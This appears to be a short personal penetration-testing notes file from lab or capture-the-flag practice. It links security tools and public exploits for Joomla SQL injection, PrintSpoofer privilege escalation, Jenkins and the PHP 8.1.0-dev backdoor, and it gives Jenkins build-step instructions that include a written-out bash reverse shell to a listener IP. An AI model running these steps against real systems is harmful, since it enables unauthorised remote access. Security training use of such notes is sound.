## Add cool sites / tools

https://sqliteonline.com/

https://vk9-sec.com/reverse-shell-on-any-cms/

https://enotes.nickapic.com/

https://explainshell.com/

https://en.wikipedia.org/wiki/List_of_file_signatures

https://osintframework.com/

## Documente some learned exploits
- Joomla 3.7.0 CVE-2017-8917 SQLi exploit   python script: https://github.com/XiphosResearch/exploits/blob/master/Joomblah/joomblah.py

- Vuln: printspoofer : To escalate privileges, the service account must have SeImpersonate privileges. (check with whoam /priv): 
https://github.com/dievus/printspoofer

- Jenkins Exploit
  - https://www.n00py.io/2017/01/compromising-jenkins-and-extracting-credentials/
  - https://infosecwriteups.com/tryhackme-internal-writeup-480ce471efdd

- Jenkins: Or build a new project: 
   - New Item > Freestyle project > Build > Add build stp > Execute shell" (or batch, depending host) 
   - paste reverse shell code (exemple: bash -c 'exec bash -i &>/dev/tcp/10.14.26.186/7777 <&1' )
   - save. 
   - set up netcat listener on ur host and run "Build Now" on Jenkins project. Grab your reverse shell as jenkins

- PHP 8.1.0-dev - 'User-Agentt' Remote Code Execution  https://www.exploit-db.com/exploits/49933
  - Reverse shell script https://github.com/flast101/php-8.1.0-dev-backdoor-rce/blob/main/revshell_php_8.1.0-dev.py
  - Details https://flast101.github.io/php-8.1.0-dev-backdoor-rce/
